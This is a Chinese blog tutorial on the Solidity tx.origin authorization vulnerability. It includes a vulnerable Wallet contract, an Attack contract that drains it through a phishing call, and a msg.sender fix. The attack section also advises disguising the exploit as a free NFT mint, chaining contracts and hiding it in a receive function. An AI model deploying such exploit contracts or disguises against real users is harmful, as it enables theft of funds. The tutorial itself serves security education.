---
weight: 5
title: "智能合约中通过 tx.origin 授权引发的不安全问题"
date: 2019-10-01T17:55:28+08:00
draft: false
author: "5oneXj"

categories: ["基础知识", "合约安全"]
tags: ["基础知识", "合约安全", "EXP", "POC"]
---


# 0x00 前言

在合约代码中，最常用的是使用 `msg.sender` 来检查授权，但有时由于有些程序员不熟悉 `tx.origin` 和 `msg.sender` 的区别，如果使用了 `tx.origin` 可能导致合约的安全问题。黑客最典型的攻击场景是利用 `tx.origin` 的代码问题常与钓鱼攻击相结合的组合拳的方式进行攻击。

tx.origin是 Solidity 中的一个全局变量，它返回发送交易的账户地址。如果授权帐户调用恶意合约，使用变量进行授权可能会使合约容易受到攻击。可以调用通过授权检查的易受攻击的合约，因为tx.origin返回交易的原始发件人，在这种情况下是授权帐户。

通过调用 `tx.origin` 来检查授权可能会导致合约受到攻击，因为 `tx.origin` 返回交易的原始发送者，因为攻击的调用链可能是 `原始发送者－>攻击合约－> 受攻击合约` 。在受攻击合约中，`tx.origin` 是原始发送者。


# 0x01 前置知识

两者都是 Solidity 中的一个全局变量。

msg.sender: 指直接调用智能合约功能的帐户或智能合约的地址
tx.origin: 指调用智能合约功能的账户地址，只有账户地址可以是tx.origin

EOA 账户和合约账户

EOA 账户和合约账户
以太坊账户分两种，外部账户(EOA)和合约账户(SCA)。

外部账户由一对公私钥进行管理，账户包含着 Ether 的余额。
合约账户除了可以含有 Ether 余额外，还拥有一段特定的代码，预先设定代码逻辑在外部账户或其他合约对其合约地址发送消息或发生交易时被调用和处理。
外部账户 EOA

由公私钥对控制
拥有 ether 余额
可以发送交易（transactions）
不包含相关执行代码
合约账户

拥有 ether 余额
含有执行代码
代码仅在该合约地址发生交易或者收到其他合约发送的信息时才会被执行
拥有自己的独立存储状态，且可以调用其他合约
msg.sender 和 tx.origin 的区别
tx.origin：表示最初的调用者，通常取得的是 EOA 的地址。

msg.sender：表示最近的调用者，通常取得是的上级调用者的地址，可以是 EOA 地址，也可以是合约地址。

如果 EOA 用户 A 调用合约 B，合约 B 调用合约 C。那么

在 C 合约中，msg.sender 就是 B 合约的地址，tx.origin 为 A 地址。
在 B 合约中，msg.sender 是 A 地址，tx.origin 也为 A 地址。
通过判断tx.origin==msg.sender来确定调用者是合约还是 EOA 账户。

{{< admonition tip "思考 ：可不可以通过判断一个账户的是否包含执行代码来区分这个账户是 EOA 还是 SCA?" >}}

不可以。因为一个合约地址的 CODESIZE是大于零的，但当地址的 CODESIZE等于零时，并不能保证其为非合约，因为合约在构造阶段 CODESIZE也为零。

{{< /admonition >}}

# 漏洞演示

下面的漏洞合约代码，在 transfer 方法中做了检查，本意是只有 owner 可以进行 transfer 操作。在这里使用的是tx.origin==owner进行检查。我们假设该 Wallet 合约的部署者是 Alice.


```solidity
contract Wallet {
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    function transfer(address payable _to, uint _amount) public {
        require(tx.origin == owner, "Not owner");

        (bool sent, ) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }
}
```

黑客(假设 Eve 为黑客)可以这样进行漏洞利用。

黑客编写一个 Attack 的合约，并进行部署。
黑客通过钓鱼等手段诱导 Wallet 合约的部署者调用 Attack 合约的 attack 方法。
黑客就窃取到了 Wallet 合约的 ETH。
Attack 合约代码

```solidity
contract Attack {
    address payable public owner;
    Wallet wallet;

    constructor(Wallet _wallet) {
        wallet = Wallet(_wallet);
        owner = payable(msg.sender);
    }

    function attack() public {
        wallet.transfer(owner, address(wallet).balance);
    }
}
```

在这个过程中，Alice 调用了 Attack 合约的 attack 方法，attack 方法调用了 wallet 合约的 transfer 方法，在 transfer 方法中 tx.origin 是 alice(在 transfer 方法中 tx.sender 是 attack 合约)，因为 alice 就是 Wallet 合约的 owner，因此通过检测，将 ETH 转给了黑客 Eve。

还有个疑问，Alice 会傻到去调用 Eve 的合约吗？

这依靠黑客 Eve 的钓鱼的手法，如果像上面的 attack 方法 Alice 一般不会上当，但如果方法名假装成免费 mint NFT 的函数 freemint，且代码里调用了其它的大量的正常代码，并且调用了其他的合约 C，在 C 合约里调用 wallet.transfer，可能就很难识别出该方法有问题了。而且 Alice 在正常生活中使用 DAPP 时(如使用 uniswap,stepn 等时)，后端采用的也是调用合约方法的形式，相比于直接发送虚假链接发送钓鱼邮件类的邮件，Alice 对此类钓鱼的警惕性会更低些。

所以，黑客为了钓鱼更易成功，可以从下面方面进行增强

多个合约连接。合约 A 调用合约 B，合约 B 调用合约 C，合约 C 调用合约 D，…………，最后合约中调用 wallet.transfer。
黑客的合约可以利用社会工程学伪装，利用贪便宜的心理，打低价或者免费 mint 的旗号，或者高息诱惑的方式等。
黑客可以将漏洞利用隐藏在receive函数中，通过诱导用户向指定的合约转账内触发漏洞利用。如假装与用户进行换币，给客户很大的折扣诱导等。

# 安全建议

建议使用 `msg.sender` 进行授权，而非不安全的 `tx.origin` ，使用不当将会造成不必要的损失。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

contract MyContract {
    address owner;

    constructor() {
        owner = msg.sender;
    }

    function sendTo(address payable receiver, uint amount) public {
      // 不安全写法：require(tx.origin == owner);
      require(msg.sender == owner);
      receiver.transfer(amount);
    }
}
```

# 参考

{{< admonition tip "Tips" >}}

SWC-115 Authorization through tx.origin
https://swcregistry.io/docs/SWC-115

使用 tx-origin 钓鱼
https://solidity-by-example.org/hacks/phishing-with-tx-origin

代码中的 tx.origin==msg.sender 有什么作用？
https://ethereum.stackexchange.com/questions/113962/what-does-msg-sender-tx-origin-actually-do-why


https://davidkathoh.medium.com/tx-origin-vs-msg-sender-93db7f234cb9
{{< /admonition >}}